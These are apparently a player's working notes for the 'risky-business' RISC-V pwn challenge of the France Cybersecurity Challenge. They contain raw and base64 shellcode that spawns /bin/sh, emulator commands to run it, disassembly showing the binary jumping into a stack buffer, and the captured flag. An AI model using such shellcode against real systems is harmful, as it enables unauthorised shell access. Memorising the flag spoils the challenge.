@@ -1,0 +1,85 @@
+socat - TCP:challenges1.france-cybersecurity-challenge.fr:4004
+
+qemu-riscv64 -strace -E LD_LIBRARY_PATH=. ./ld-linux-riscv64-lp64d.so.1 ./risky-business
+
+https://wiki.debian.org/RISC-V
+https://www.ports.debian.org/archive
+https://wiki.debian.org/RISC-V#Setting_up_a_riscv64_virtual_machine
+
+shellcode:
+
+https://thomask.sdf.org/blog/2018/08/25/basic-shellcode-in-riscv-linux.html
+http://shell-storm.org/shellcode/files/shellcode-908.php
+
+python3 -c 'b = b"\xb7\xa4\x43\x03\x9b\x84\x94\x97\xb2\x04\x93\x84\x74\x7b\xb2\x04\x93\x84\xb4\x34\xb6\x04\x93\x84\xf4\x22\x23\x38\x91\xfe\x23\x3c\x01\xfe\x13\x05\x01\xff\x93\x25\xf0\xff\x13\x26\xf0\xff\x93\x08\xd0\x0d\x93\x06\x30\x07\x23\x0e\xd1\xfe\x93\x06\xe1\xff\x67\x80\xe6\xff";import sys;sys.stdout.buffer.write(b)' |qemu-riscv64 -strace -E LD_LIBRARY_PATH=. ./ld-linux-riscv64-lp64d.so.1 ./risky-business
+
+fail
+
+podman run --rm -ti localhost/fcsc_pwn_riscky bash 
+
+python3 -c 'b = b"\xb7\xa4\x43\x03\x9b\x84\x94\x97\xb2\x04\x93\x84\x74\x7b\xb2\x04\x93\x84\xb4\x34\xb6\x04\x93\x84\xf4\x22\x23\x38\x91\xfe\x23\x3c\x01\xfe\x13\x05\x01\xff\x93\x25\xf0\xff\x13\x26\xf0\xff\x93\x08\xd0\x0d\x93\x06\x30\x07\x23\x0e\xd1\xfe\x93\x06\xe1\xff\x67\x80\xe6\xff";import sys;sys.stdout.buffer.write(b)' | /qemu/riscv64-linux-user/qemu-riscv64 -strace -L /usr/riscv64-linux-gnu/ ./risky-business
+
+18 brk(NULL) = 0x0000004000003000
+18 brk(0x0000004000024000) = 0x0000004000003000
+18 mmap(NULL,1048576,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0) = 0x0000004000936000
+18 read(0,0x936260,4096) = 66
+18 exit_group(0)
+
+Option -d in_asm:
+
+    ----------------
+    IN: main
+    0x000000400000088a:  fa040793          addi            a5,s0,-96
+    0x000000400000088e:  f8f43c23          sd              a5,-104(s0)
+    0x0000004000000892:  f9843783          ld              a5,-104(s0)
+    0x0000004000000896:  9782              jalr            ra,a5,0
+
+    ----------------
+    IN: 
+    0x0000004000803c40:  0000              illegal
+    
+
+Base64 (issue with Python):
+
+0x0000004000803bf0:  03878513          addi            a0,a5,56
+0x0000004000803bf4:  4601              mv              a2,zero
+0x0000004000803bf6:  4581              mv              a1,zero
+0x0000004000803bf8:  04b7b023          sd              a1,64(a5)
+0x0000004000803bfc:  fff58813          addi            a6,a1,-1
+0x0000004000803c00:  03c7b683          ld              a3,60(a5)
+0x0000004000803c04:  0108c6b3          xor             a3,a7,a6
+0x0000004000803c08:  02d7be23          sd              a3,60(a5)
+0x0000004000803c0c:  0307b683          ld              a3,48(a5)
+0x0000004000803c10:  0108c6b3          xor             a3,a7,a6
+0x0000004000803c14:  02d7b823          sd              a3,48(a5)
+0x0000004000803c18:  0347b883          ld              a7,52(a5)
+0x0000004000803c1c:  0108c8b3          xor             a7,a7,a6
+0x0000004000803c20:  ff8c              sd              a1,56(a5)
+0x0000004000803c22:  000000000000ffff  illegal         
+
+where is the shellcode ?
+    0000000000000746 <main>:
+     746:	7119                	addi	sp,sp,-128
+     748:	fc86                	sd	ra,120(sp)
+     74a:	f8a2                	sd	s0,112(sp)
+     74c:	0100                	addi	s0,sp,128                       // s0 = stack top
+     88a:	fa040793          	addi	a5,s0,-96
+     88e:	f8f43c23          	sd	a5,-104(s0)
+     892:	f9843783          	ld	a5,-104(s0)
+     896:	9782                	jalr	a5                      // call s0-96  !!!
+
+=> shellcode en s0-96 = sp+128-96 = sp+224
+
+-d in_asm
+    => the whole block gets optimized :(
+
+=> E4WHA4FFE4j1/4O4xwOzxggBI77XAoO4BwOzSBgBI7gXA5OIqAZjkgUBY5IFAQFGjP///yL///8vYmlu0IyX////
+
+id
+uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+ls
+flag
+risky-business
+run.sh
+cat flag
+FCSC{d79704401bf7c58ca46f3711a9a8c8207d0c4ce7d80fd0dc41df6d5e44b3ddaf}
